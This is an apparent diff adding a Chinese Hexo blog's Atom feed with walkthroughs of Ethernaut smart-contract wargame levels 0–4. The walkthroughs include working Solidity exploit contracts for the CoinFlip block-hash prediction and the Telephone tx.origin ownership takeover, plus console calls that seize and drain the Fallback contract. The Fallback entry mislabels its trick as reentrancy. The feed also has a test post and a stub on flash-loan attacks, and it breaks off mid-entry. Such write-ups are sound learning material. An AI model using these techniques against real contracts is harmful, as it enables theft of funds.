@@ -1,0 +1,442 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>KW&#39;s blog</title>
+  
+  <subtitle>博客副标题</subtitle>
+  <link href="https://kdlwtrdrgm.github.io/atom.xml" rel="self"/>
+  
+  <link href="https://kdlwtrdrgm.github.io/"/>
+  <updated>2021-08-02T08:59:05.447Z</updated>
+  <id>https://kdlwtrdrgm.github.io/</id>
+  
+  <author>
+    <name>KW</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>未命名</title>
+    <link href="https://kdlwtrdrgm.github.io/%E6%9C%AA%E5%88%86%E7%B1%BB/test/"/>
+    <id>https://kdlwtrdrgm.github.io/%E6%9C%AA%E5%88%86%E7%B1%BB/test/</id>
+    <published>2021-08-02T08:43:59.000Z</published>
+    <updated>2021-08-02T08:59:05.447Z</updated>
+    
+    <content type="html"><![CDATA[<p>f</p><p>发生的撒地方阿斯顿</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;f&lt;/p&gt;
+&lt;p&gt;发生的撒地方阿斯顿&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="未分类" scheme="https://kdlwtrdrgm.github.io/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Hello Ethernaut第0关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/0.Ethernaut-Hello%20Ethernaut/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/0.Ethernaut-Hello%20Ethernaut/</id>
+    <published>2021-07-27T09:17:00.000Z</published>
+    <updated>2021-08-02T08:27:30.394Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Hello-Ethernaut第0关练习"><a href="#Hello-Ethernaut第0关练习" class="headerlink" title="Hello Ethernaut第0关练习"></a>Hello Ethernaut第0关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>熟悉关卡，另有一个熟悉代码的教程：<a href="https://cryptozombies.io/zh/"></a><a href="https://cryptozombies.io/zh/">CryptoZombies</a></p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><p>无</p><h2 id="游戏基础教学："><a href="#游戏基础教学：" class="headerlink" title="游戏基础教学："></a>游戏基础教学：</h2><p>题目上有详细步骤，</p><ol><li><p>通过谷歌浏览器下载meta mask插件，按照他的步骤设置meta mask钱包，记住当时的助记码，使用rinbeby网络</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730112253313.png"></p></li><li><p>通过水龙头获取一些测试币，ethernaut游戏是rinkeby网络<a href="https://faucet.rinkeby.io/">这个 faucet</a>。获取的流程是通过推特发送一个条含有你钱包的地址的推特然后将推特的链接复制下来粘贴到水龙头网站上，（完成整个游戏大概只需要10eth，因为是测试币，多了没用）如图：</p></li></ol><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730112428497.png"><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730112649378.png"></p><p>3、然后按F12打开开发者工具中的控制台，输入player,回车</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730113113231.png"></p><p>4、这些功能都可以看一下做一下：</p><pre><code>player//玩家地址getBalance(player)//玩家余额help()//帮助文档instance或contract.address()//合约地址await ethernaut.owner//部署合约的所有者，我们常用await让代码更简洁直观，下图有对比await contract.abi//查看他的应用二进制接口有哪些</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730113705393.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730113906895.png"></p><p>5、见面关是有题目的<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730114140701.png"></p><p>我们按照步骤走</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730114812158.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115115264.png"></p><p>6、付gas费，有时候可能会因为网络问题导致比较慢，耐心点等，<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115340988.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115220065.png"></p><p>7、这样就算是完成交易了，浏览器会有弹窗，confirmed就代表交易成功，</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115609324.png"></p><p>8、点击提交实例，再付一次gas费，就可以看到，这一关就结束了，下一关</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115641708.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115951387.png"></p>]]></content>
+    
+    
+    <summary type="html">第0关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Fall Out第1关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/1.Ethernaut-Fallback/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/1.Ethernaut-Fallback/</id>
+    <published>2021-07-26T10:55:00.000Z</published>
+    <updated>2021-08-02T08:27:30.395Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Fall-out第1关练习"><a href="#Fall-out第1关练习" class="headerlink" title="Fall out第1关练习"></a>Fall out第1关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>仔细查看下面的合约代码。</p><p>你会打败这个级别，如果</p><ol><li>您声称拥有合同的所有权</li><li>您将其余额减少到 0</li></ol><p> 可能有帮助的事情</p><ul><li>与 ABI 交互时如何发送以太币</li><li>如何在 ABI 之外发送以太币</li><li>wei/ether 单位之间的相互转换 - 参见 help() 命令 -</li><li>回退方法</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallback {//Fallback合约继承自Ownable合约  using SafeMath for uint256;  mapping(address =&gt; uint) public contributions;  //通过映射,可以使用地址获取贡献的值  address payable public owner;  constructor() public {    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  }//构造函数设置合约创建者的贡献值为1000以太币  modifier onlyOwner {        require(            msg.sender == owner,            "caller is not the owner"        );        _;    }  function contribute() public payable {    require(msg.value &lt; 0.001 ether);//每次贡献的值小于0.001以太币    contributions[msg.sender] += msg.value;//累计起来    if(contributions[msg.sender] &gt; contributions[owner]) {      owner = msg.sender;    }//当你贡献的值大于1000的时候就你成为合约所有者  }  function getContribution() public view returns (uint) {    return contributions[msg.sender];  }//获取你的贡献值  function withdraw() public onlyOwner {    owner.transfer(address(this).balance);  }//onlyOwner修饰,所以只有合约所有者才能用来提款  fallback() external payable {    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);//判断金额与贡献值是否大于零    owner = msg.sender;//msg.sender就是调用者,也就是我们    //执行这一条语句owner就成了我们  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>合约构造函数 Fallback() 中初始化拥有者贡献度为 1000 ether。<br>我们可以通过转钱提升贡献度，当贡献度超过 1000 ether 即可成为合约 owner。<br>但在 contribute() 中限制了每次只能转小于 0.001 ether 的钱。很明显，此路不通。</p><p>那应该怎么办呢？这里是重入攻击的关键，同时也是The DAO事件里黑客所用到的攻击。</p><p>思路：首先贡献一点金额，来通过 require 触发 fallback 函数，来成为合约的所有者，然后 withdraw 函数转走合约中的所有钱</p><p><a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html?highlight=transfer#fallback">可以参考官网对fallback的描述</a></p><p><code>fallback</code> 函数被调用的情况有两种</p><ul><li>调用合约中不存在的函数</li><li>当合约收到以太币（没有任何数据）</li></ul><p>此外，为了接收以太币，<code>fallback</code> 函数必须标记为 <code>payable</code>。</p><p>也就是说想要满足题目要求，先成为owner，这里能够做到</p><pre><code class="solidity">fallback() external payable {    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);//判断金额与贡献值是否大于零    owner = msg.sender;//msg.sender就是调用者,也就是我们    //执行这一条语句owner就成了我们  }</code></pre><p>其实成为 owner 还有另一种方式，我们仔细看合约的 fallback 函数，即最下方的无名函数。<strong>当合约账户收到一笔转账时会自动调用 fallback 函数</strong>。在这里，只要转账金额大于0，并且贡献大于0，即可成为 owner。要满足<code>contributions[msg.sender]&gt;0</code>首先需要通过<code>contribute</code>函数给到<code>contributions[msg.sender]</code>1wei,这里可以了解一下help()相关的信息<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728101232782.png"></p><p>可以了解下<a href="http://cw.hubwiz.com/card/c/web3.js-1.0/1/8/24/">wei和ether</a>，</p><p>第二个要求，通过withdraw函数将来实现</p><pre><code>  function withdraw() public onlyOwner {    owner.transfer(address(this).balance);  }//onlyOwner修饰,所以只有合约所有者才能用来提款</code></pre><p>接下来进入实例吧</p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、点击获取新实例，meta mask提交gas以后在控制台，查看以下信息，玩家地址，合约地址，实例余额，合约拥有者，（注意：每支付完一笔gas费都要稍等片刻，等待交易）</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728095637344.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728101832333.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728095736638.png"></p><p>2、要满足题目要求<code>contributions[msg.sender]&gt;0</code>我们使用</p><pre><code>contract.contribute({value: 1})</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728101823453.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728101940334.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728102151994.png"></p><p>3、上面就完成了第一步，接着我们触发fallback函数，触发 fallback 函数的条件：</p><ul><li>当调用一个不存在的函数的时候</li><li>发送没有数据的纯 ether 时</li></ul><pre><code>contract.sendTransaction({value: 1})</code></pre><p>楼上说了当合约账户收到一笔转账时会自动调用 fallback 函数，</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728102450233.png"></p><p>这时候合约收到了2wei，合约余额是2wei，触发了fallback函数，owner变成了我们自己，就是<code>msg.sender</code>。</p><p>4、第二个要求，使用了withdraw使用了transfer()函数实现</p><pre><code>contract.withdraw() </code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728104354780.png"></p><p>这时候目标完成，快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728104451929.png" alt="image-20210728104451929"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728104608313.png" alt="image-20210728104608313"></p>]]></content>
+    
+    
+    <summary type="html">第1关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Fall Back第2关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/2.Ethernaut-Fall%20out/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/2.Ethernaut-Fall%20out/</id>
+    <published>2021-07-26T08:31:00.000Z</published>
+    <updated>2021-08-02T08:27:30.402Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Fall-back第2关练习"><a href="#Fall-back第2关练习" class="headerlink" title="Fall back第2关练习"></a>Fall back第2关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li>您声称拥有合同的所有权</li></ol><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallout {    using SafeMath for uint256;  mapping (address =&gt; uint) allocations;  address payable public owner;  /* constructor */  function Fal1out() public payable {    owner = msg.sender;    allocations[owner] = msg.value;  }  modifier onlyOwner {            require(                msg.sender == owner,                "caller is not the owner"            );            _;        }  function allocate() public payable {    allocations[msg.sender] = allocations[msg.sender].add(msg.value);  }  function sendAllocation(address payable allocator) public {    require(allocations[allocator] &gt; 0);    allocator.transfer(allocations[allocator]);  }  function collectAllocations() public onlyOwner {    msg.sender.transfer(address(this).balance);  }  function allocatorBalance(address allocator) public view returns (uint) {    return allocations[allocator];  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><ul><li>我们可以发现一个很明显的问题，理论上应该写成 <code>Fallout</code> 的构造函数被写成了 <code>Fal1out</code> ，那么该函数就不是构造函数，意味着该函数可以被我们调用（我们无法调用构造函数）。</li></ul><p>并且可以看见<code>owner = msg.sender</code>，直接达到我们的目的，所以直接调用查看owner即可</p><pre><code>await contract.Fal1out()//调用Fal1out()函数await contract.owner()//查看当前合约拥有者</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730110723192.png"></p><p>2、查看玩家地址，合约地址，查看一下合约拥有者</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730110746115.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730111106753.png"></p><p>3、调用Fal1out()函数，付gas费，查看当前合约拥有者已变成我们玩家自己</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730110927346.png"></p><p>4、快乐提交去吧</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730111156531.png"></p>]]></content>
+    
+    
+    <summary type="html">第2关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Coin Flip第3关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/3.Ethernaut-Coin%20Filp/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/3.Ethernaut-Coin%20Filp/</id>
+    <published>2021-07-26T05:40:00.000Z</published>
+    <updated>2021-08-02T08:27:30.404Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Coin-Flip第3关练习"><a href="#Coin-Flip第3关练习" class="headerlink" title="Coin Flip第3关练习"></a>Coin Flip第3关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li>这是一个掷硬币游戏，你需要通过猜测掷硬币的结果来建立你的连胜记录。要完成这一关，你需要使用你的心理能力连续10次猜测正确的结果。</li></ol><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol'; contract CoinFlip {  using SafeMath for uint256;  uint256 public consecutiveWins;//连胜次数  uint256 lastHash;//上一个hash  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    //这个数是2^255  function CoinFlip() public {    consecutiveWins = 0;  }//构造函数，每次开始把赢的次数归零   function flip(bool _guess) public returns (bool) {    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));        //blockValue等于前一个区块的hash值转换成uint256,block.number是当前区块数,减一就是上一个了    if (lastHash == blockValue) {      revert();//如果最后的hash等于计算出来的    }//中止执行并将所做的更改还原为执行前状态     lastHash = blockValue;//改成上个区块的hash值为这个区块的    uint256 coinFlip = blockValue.div(FACTOR);    //coinFlip等于blockValue除以FACTOR,而FACTOR换成256的二进制就是最左位是0，右边全是1    //因为除法运算会取整,所以coinFlip由blockValue的最高位决定    bool side = coinFlip == 1 ? true : false;     if (side == _guess) {      consecutiveWins++;//如果我们猜的跟他算出来的一样的话连胜次数加一      return true;    } else {      consecutiveWins = 0;//否则归零      return false;    }  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>我们来考虑一下，应该怎么实现攻击，首先，我们已经知道他的算法是怎么样的了，而且它用来计算的东西我们同样可以找到，所以，我们完全可以先进行计算，把结果在给他发过去就好啦</p><p>exp 如下，把 exp 代码复制到 remix IDE 中，部署 exploit 合约（要用之前得到的那个合约地址）</p><pre><code>pragma solidity ^0.4.18;import './SafeMath.sol'; contract CoinFlip {  using SafeMath for uint256;  uint256 public consecutiveWins;//连胜次数  uint256 lastHash;//上一个hash  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    //这个数是2^255  function CoinFlip() public {    consecutiveWins = 0;  }//构造函数，每次开始把赢的次数归零   function flip(bool _guess) public returns (bool) {    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));        //blockValue等于前一个区块的hash值转换成uint256,block.number是当前区块数,减一就是上一个了    if (lastHash == blockValue) {      revert();//如果最后的hash等于计算出来的    }//中止执行并将所做的更改还原为执行前状态     lastHash = blockValue;//改成上个区块的hash值为这个区块的    uint256 coinFlip = blockValue.div(FACTOR);    //coinFlip等于blockValue除以FACTOR,而FACTOR换成256的二进制就是最左位是0，右边全是1    //因为除法运算会取整,所以coinFlip由blockValue的最高位决定    bool side = coinFlip == 1 ? true : false;     if (side == _guess) {      consecutiveWins++;//如果我们猜的跟他算出来的一样的话连胜次数加一      return true;    } else {      consecutiveWins = 0;//否则归零      return false;    }  }}contract attack{    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    CoinFlip expFlip = CoinFlip(0x199fc78CC3057E5199184E8099C92E481d119f7a);  //这表示已经有一个CoinFlip合约部署在了这个地址    function pwn() public{         uint256 blockValue = uint256(block.blockhash(block.number-1));          uint256 coinFlip = blockValue /FACTOR;          bool side = coinFlip == 1 ? true : false;          expFlip.flip(side);    }}</code></pre><p>常用的SafeMath.sol也可以贴一下</p><pre><code>//SafeMath.solpragma solidity ^0.4.18;library SafeMath {  function mul(uint256 a, uint256 b) internal pure returns (uint256) {    if (a == 0) {      return 0;    }    uint256 c = a * b;    assert(c / a == b);    return c;  }  function div(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a / b;    return c;  }  function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b &lt;= a);    return a - b;  }  function add(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a + b;    assert(c &gt;= a);    return c;  }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、点击“Get new Instance”来获取一个实例。然后拿到合约的地址以及 consecutiveWins 的值</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730121209424.png"></p><p>2、在 <a href="http://remix.ethereum.org/">http://remix.ethereum.org</a> 部署我们的合约，先新建一个workspaces自己命名然后再其contracts目录下（也可以自己新建文件夹）新建两个sol文件并命名，将上面代码复制过去</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730121511130.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730121844331.png"></p><p>将solidity版本修改成为一样的0.4.18版本</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730122546013.png"></p><p>compile绿色黄色说明是小问题，红色需要找到报错的代码进行对应的修改，进行deploy，注意图中的Injected Web3，对应的CONTRACT,再点击Deploy,付gas费，稍等片刻成功以后会看到下面出现一个pwn函数<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730122837903.png"></p><p>3、点击pwn，付gas费，不要急，慢慢等成功<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123313405.png"></p><p>可以再console中检查一下是否成功，有1次了，说明成功了，我们执行到10次，记住不要急，一个一个慢慢来<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123357768.png"></p><p>4、钱包里面可以看到状态<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123622136.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123938873.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123929511.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124025063.png"></p><p>我们这里是失败了一次，没关系我们继续pwn，gaslimit也可以自己调整一个合适的值，要比钱包活动中pwn的数量大一些，<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124306887.png"></p><p>有时候默认的燃料不够会导致失败，我们就设置成50000就没问题<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124501782.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124619398.png"></p><p>5、直到数值变成10，我们就可以提交实例了</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124754791.png"></p>]]></content>
+    
+    
+    <summary type="html">第3关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Telephone第4关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/4.Ethernaut-Telephone/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/4.Ethernaut-Telephone/</id>
+    <published>2021-07-24T03:33:00.000Z</published>
+    <updated>2021-08-02T08:27:30.405Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Telephone第4关练习"><a href="#Telephone第4关练习" class="headerlink" title="Telephone第4关练习"></a>Telephone第4关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li>获取合约的权限</li></ol><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>观察合约，我们的目的是要获取合约的权限，所以观察合约中是否有owner = msg.sender。发现一处是在构造函数中，把owner赋值给合约的创建者，检查构造函数没有问题。接下来我们查看changeOwner函数中的if (tx.origin != msg.sender) ,其中tx.origin表示最初交易发起人，msg.sender表示消息的发起人,举个栗子：</p><p>假设这样一条调用链：A -&gt; B -&gt; C -&gt; D，其中D 的 msg.sender 是 C，其 tx.origin 为 A。</p><p>如果在同一个合约中使用的话，他们tx.origin=msg.sender，如果在多合约的情况下，比如用户A通过合约来调用B合约，那么对于B合约来说，msg.sender就是合约A，tx.origin是用户，实际使用中，应该避免使用tx.origin(1,之后可能被废弃2，容易引发安全问题)</p><p>所以只要tx.origin不等于msg.sender，我们就可以调用changeOwner替换掉owner，所以构造这样一个合约：</p><pre><code class="solidity">pragma solidity ^0.5.0;contract Telephone {  address public owner;  constructor() public {    owner = msg.sender;  }  function changeOwner(address _owner) public {    if (tx.origin != msg.sender) {      owner = _owner;    }  }}contract exp{    Telephone a = Telephone(输入你的实例地址);    function hack() public{        a.changeOwner(msg.sender);    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、点击“Get new Instance”来获取一个实例。</p><p>2、输入contract.address来获取合约地址，用输出的合约地址替换以下合约中的地址在remix中编译合约：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723132604842.png"></p><pre><code class="solidity">pragma solidity ^0.5.0;contract Telephone {  address public owner;  constructor() public {    owner = msg.sender;  }  function changeOwner(address _owner) public {    if (tx.origin != msg.sender) {      owner = _owner;    }  }}contract exp{    Telephone a = Telephone(0x66be5c7AD850F3742A727fA0Ac35258831b437B5);    function hack() public{        a.changeOwner(msg.sender);    }}</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723142522932.png"></p><p>点击hack稍等片刻，查看原合约中的owner的地址：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723142731570.png"></p><p>提交，收获胜利</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723143005250.png"></p>]]></content>
+    
+    
+    <summary type="html">第4关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>闪电贷攻防和智能合约审计</title>
+    <link href="https://kdlwtrdrgm.github.io/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%97%AA%E7%94%B5%E8%B4%B7%E6%94%BB%E9%98%B2%E4%B8%8E%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
+    <id>https://kdlwtrdrgm.github.io/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%97%AA%E7%94%B5%E8%B4%B7%E6%94%BB%E9%98%B2%E4%B8%8E%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/</id>
+    <published>2021-07-23T09:35:57.465Z</published>
+    <updated>2021-08-02T08:27:30.409Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="闪电贷攻防和智能合约审计"><a href="#闪电贷攻防和智能合约审计" class="headerlink" title="闪电贷攻防和智能合约审计"></a>闪电贷攻防和智能合约审计</h1><h2 id="什么是闪电贷"><a href="#什么是闪电贷" class="headerlink" title="什么是闪电贷"></a>什么是闪电贷</h2><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723173933012.png"></p><p>本身是一个很好的金融创新，必须在智能合约中操作，原子性，最小单位执行，不成功就失败，要么成功要么失败</p><p>闪电贷和闪电兑</p><p>闪电贷AAVE项目</p><p>闪电兑函数UniswapV2项目</p><p>乐观转账</p><p>区别在于data参数有没有变化</p><h2 id="闪电贷攻击事件分析"><a href="#闪电贷攻击事件分析" class="headerlink" title="闪电贷攻击事件分析"></a>闪电贷攻击事件分析</h2><h2 id="闪电贷攻击防范建议"><a href="#闪电贷攻击防范建议" class="headerlink" title="闪电贷攻击防范建议"></a>闪电贷攻击防范建议</h2><h2 id="智能合约审计"><a href="#智能合约审计" class="headerlink" title="智能合约审计"></a>智能合约审计</h2>]]></content>
+    
+    
+    <summary type="html">学习智能合约审计</summary>
+    
+    
+    
+    <category term="区块链" scheme="https://kdlwtrdrgm.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    
+    <category term="区块链" scheme="https://kdlwtrdrgm.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>跨链与侧链</title>
+    <link href="https://kdlwtrdrgm.github.io/%E5%8C%BA%E5%9D%97%E9%93%BE/Ethernaut-%E6%B3%A2%E5%8D%A1%E5%92%8CCOMCOS/"/>
+    <id>https://kdlwtrdrgm.github.io/%E5%8C%BA%E5%9D%97%E9%93%BE/Ethernaut-%E6%B3%A2%E5%8D%A1%E5%92%8CCOMCOS/</id>
+    <published>2021-07-23T09:01:15.613Z</published>
+    <updated>2021-08-02T08:27:30.408Z</updated>
+    
